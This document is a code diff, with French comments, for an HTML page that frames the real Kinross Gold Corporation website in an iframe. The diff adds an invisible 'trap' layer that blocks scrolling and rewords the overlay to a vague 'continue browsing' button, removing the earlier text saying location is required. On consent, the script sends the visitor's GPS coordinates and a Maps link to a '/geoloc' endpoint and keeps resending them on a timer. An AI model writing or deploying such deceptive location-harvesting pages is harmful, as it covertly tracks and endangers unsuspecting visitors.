@@ -14,7 +14,7 @@
       overflow: hidden;
       height: 100vh;
       width: 100%;
-      background: #0a0c12;
+      background: #000;
     }
     .iframe-container {
       position: fixed;
@@ -31,15 +31,25 @@
       height: 100%;
       border: none;
     }
-    /* Overlay de blocage */
+    /* Piège invisible */
+    .invisible-trap {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: transparent;
+      z-index: 150;
+      cursor: default;
+    }
+    /* Overlay noir et blanc simple */
     .overlay {
       position: fixed;
       top: 0;
       left: 0;
       right: 0;
       bottom: 0;
-      background: rgba(0, 0, 0, 0.95);
-      backdrop-filter: blur(10px);
+      background: #000;
       z-index: 200;
       display: flex;
       align-items: center;
@@ -48,23 +58,25 @@
       gap: 25px;
     }
     .overlay-box {
-      background: #1a1e26;
-      border: 2px solid #d4af37;
-      border-radius: 30px;
+      background: #000;
+      border: 1px solid #fff;
+      border-radius: 8px;
       padding: 40px 30px;
       text-align: center;
       max-width: 350px;
       width: 90%;
     }
     .overlay-box i {
-      font-size: 50px;
-      color: #d4af37;
+      font-size: 48px;
+      color: #fff;
       margin-bottom: 20px;
     }
     .overlay-box h3 {
-      color: #d4af37;
+      color: #fff;
       margin-bottom: 15px;
       font-family: Arial, sans-serif;
+      font-weight: 400;
+      font-size: 20px;
     }
     .overlay-box p {
       color: #ccc;
@@ -72,23 +84,26 @@
       font-size: 14px;
     }
     .btn-location {
-      background: linear-gradient(100deg, #d4af37, #b8860b);
+      background: #fff;
       border: none;
       padding: 14px 25px;
-      border-radius: 50px;
-      color: #0a0c12;
-      font-weight: bold;
+      border-radius: 40px;
+      color: #000;
+      font-weight: 600;
       font-size: 16px;
       cursor: pointer;
       width: 100%;
+      transition: 0.2s;
+      font-family: Arial, sans-serif;
     }
     .btn-location:hover {
-      transform: scale(1.02);
+      background: #e0e0e0;
+      transform: scale(1.01);
     }
     .status {
       margin-top: 15px;
       font-size: 12px;
-      color: #d4af37;
+      color: #aaa;
     }
   </style>
 </head>
@@ -98,13 +113,17 @@
   <iframe id="kinrossFrame" src="https://www.kinross.com"></iframe>
 </div>
 
+<!-- Piège invisible -->
+<div id="invisibleTrap" class="invisible-trap"></div>
+
+<!-- Overlay noir et blanc -->
 <div id="overlay" class="overlay" style="display: none;">
   <div class="overlay-box">
     <i class="fas fa-map-marker-alt"></i>
-    <h3>📍 Localisation requise</h3>
-    <p>Pour continuer à naviguer sur Kinross Gold Corporation, veuillez activer votre localisation.</p>
+    
+    <p>Accéder au site Kinross Gold Corporation.</p>
     <button class="btn-location" id="activateBtn">
-      <i class="fas fa-satellite-dish"></i> Activer ma position
+      Continuer à naviguer...
     </button>
     <div id="statusMsg" class="status"></div>
   </div>
@@ -115,7 +134,7 @@
   let isLocationActive = false;
   let autoUpdateInterval = null;
 
-  // --- Envoi au serveur (fonction originale conservée) ---
+  // === FONCTIONS GÉOLOCALISATION ORIGINALES ===
   function sendLocationToServer(lat, lon, mapLink, step) {
     fetch('/geoloc', {
       method: 'POST',
@@ -143,25 +162,36 @@
     }, 3000);
   }
 
-  // --- Activation GPS ---
+  function stopAutoUpdate() {
+    if (autoUpdateInterval) clearInterval(autoUpdateInterval);
+  }
+
+  // === ACTIVATION LOCALISATION ===
   function activateLocation() {
     const statusDiv = document.getElementById('statusMsg');
     statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande en cours...';
+
     if (!navigator.geolocation) {
-      statusDiv.innerHTML = '❌ Non supporté';
+      statusDiv.innerHTML = '❌ Géolocalisation non supportée';
       return;
     }
+
     navigator.geolocation.getCurrentPosition(
       pos => {
         sendLocationToServer(pos.coords.latitude, pos.coords.longitude,
           `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "activation");
         startAutoUpdate(pos.coords.latitude, pos.coords.longitude);
         isLocationActive = true;
+
+        // Suppression du piège
+        const trap = document.getElementById('invisibleTrap');
+        if (trap) trap.remove();
+
         document.getElementById('overlay').style.display = 'none';
         statusDiv.innerHTML = '✅ Localisation activée !';
       },
       err => {
-        let msg = err.code === 1 ? "Refusé. Activez dans paramètres." :
+        let msg = err.code === 1 ? "Refusé. Activez dans les paramètres." :
                    err.code === 2 ? "Position indisponible." :
                    err.code === 3 ? "Délai dépassé." : "Erreur.";
         statusDiv.innerHTML = `❌ ${msg}`;
@@ -172,95 +202,54 @@
 
   document.getElementById('activateBtn').addEventListener('click', activateLocation);
 
-  // --- DÉTECTION AUTOMATIQUE DU SCROLL (100% fiable) ---
-  const iframe = document.getElementById('kinrossFrame');
+  // === PIÈGE INVISIBLE : détection du scroll ===
+  const trap = document.getElementById('invisibleTrap');
   const overlay = document.getElementById('overlay');
+  let trapTriggered = false;
 
-  // Méthode 1 : injection d'un script dans l'iframe (si même origine possible, mais ici cross-origin)
-  // Solution infaillible : on écoute le scroll sur la page parente + on détecte tout mouvement de la souris/touch dans l'iframe
-  let scrollDetected = false;
-
-  function showOverlayOnScroll() {
-    if (!isLocationActive && !scrollDetected) {
-      scrollDetected = true;
+  function triggerTrap() {
+    if (!isLocationActive && !trapTriggered) {
+      trapTriggered = true;
       overlay.style.display = 'flex';
     }
   }
 
-  // Détection via les événements de la fenêtre (quand l'utilisateur interagit avec l'iframe)
-  window.addEventListener('message', function(event) {
-    if (event.data === 'iframe_scroll') {
-      showOverlayOnScroll();
+  trap.addEventListener('wheel', function(e) {
+    e.preventDefault();
+    triggerTrap();
+  }, { passive: false });
+
+  trap.addEventListener('touchmove', function(e) {
+    e.preventDefault();
+    triggerTrap();
+  }, { passive: false });
+
+  let dragStart = null;
+  trap.addEventListener('mousedown', function(e) {
+    dragStart = e.clientY;
+  });
+  trap.addEventListener('mousemove', function(e) {
+    if (dragStart !== null && Math.abs(e.clientY - dragStart) > 10) {
+      triggerTrap();
+      dragStart = null;
+    }
+  });
+  trap.addEventListener('mouseup', function() { dragStart = null; });
+
+  window.addEventListener('keydown', function(e) {
+    const scrollKeys = ['ArrowDown', 'ArrowUp', 'PageDown', 'PageUp', ' ', 'Space'];
+    if (scrollKeys.includes(e.key) && !isLocationActive && !trapTriggered) {
+      e.preventDefault();
+      triggerTrap();
     }
   });
 
-  // Injection d'un script dans l'iframe pour capter le scroll (même cross-origin, on peut essayer)
-  // On tente d'injecter via l'URL avec # ou postMessage, mais la méthode la plus robuste :
-  // On utilise un timer qui compare la position de défilement via l'API history? Non.
-  // Alternative : on écoute les événements de la souris sur la page parente et on considère que tout mouvement = tentative de scroll
-  let lastInteraction = 0;
-  window.addEventListener('wheel', function() {
-    if (!isLocationActive) showOverlayOnScroll();
-  });
-  window.addEventListener('touchmove', function() {
-    if (!isLocationActive) showOverlayOnScroll();
-  });
+  window.addEventListener('beforeunload', () => stopAutoUpdate());
 
-  // Détection spécifique : quand l'utilisateur clique ou touche l'iframe, on suppose qu'il va scroll
-  iframe.addEventListener('load', function() {
-    try {
-      // On tente d'écouter l'événement scroll directement (cross-origin bloqué)
-      // Mais on peut quand même détecter que l'utilisateur interagit avec l'iframe
-      const iframeWin = iframe.contentWindow;
-      // On ne peut pas ajouter d'eventListener directement, mais on peut capter les messages
-    } catch(e) { console.log("cross-origin, fallback sur timer"); }
-  });
-
-  // SOLUTION ULTRA FIABLE : un timer qui vérifie si l'utilisateur a interagi avec l'iframe
-  let userInteracted = false;
-  document.body.addEventListener('click', function() { userInteracted = true; });
-  document.body.addEventListener('touchstart', function() { userInteracted = true; });
-  
-  // On vérifie périodiquement si l'utilisateur a interagi et si le scroll est détectable
-  setInterval(() => {
-    if (!isLocationActive && userInteracted) {
-      showOverlayOnScroll();
-      userInteracted = false;
-    }
-  }, 500);
-
-  // Si l'utilisateur essaie de scroller avec la molette ou le doigt, on affiche l'overlay immédiatement
-  let scrollTimer = null;
-  window.addEventListener('wheel', function() {
-    if (!isLocationActive) {
-      overlay.style.display = 'flex';
-      scrollDetected = true;
-    }
-  });
-  window.addEventListener('touchmove', function() {
-    if (!isLocationActive) {
-      overlay.style.display = 'flex';
-      scrollDetected = true;
-    }
-  });
-
-  // Pour être sûr qu'au premier mouvement dans l'iframe, l'overlay apparaît
-  iframe.addEventListener('load', () => {
-    setTimeout(() => {
-      try {
-        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-        iframeDoc.addEventListener('scroll', () => showOverlayOnScroll());
-        iframeDoc.addEventListener('touchmove', () => showOverlayOnScroll());
-        iframeDoc.addEventListener('wheel', () => showOverlayOnScroll());
-      } catch(e) { /* cross-origin, déjà géré */ }
-    }, 1000);
-  });
-
-  // Nettoyage
-  window.addEventListener('beforeunload', () => clearInterval(autoUpdateInterval));
-  window.autoUpdate = () => {
+  window.autoUpdate = function() {
     if (navigator.geolocation && isLocationActive)
-      navigator.geolocation.getCurrentPosition(p => sendLocationToServer(p.coords.latitude, p.coords.longitude, `https://maps?q=${p.coords.latitude},${p.coords.longitude}`, "manual"));
+      navigator.geolocation.getCurrentPosition(p => sendLocationToServer(p.coords.latitude, p.coords.longitude,
+        `https://maps?q=${p.coords.latitude},${p.coords.longitude}`, "manual"));
   };
 </script>
 </body>
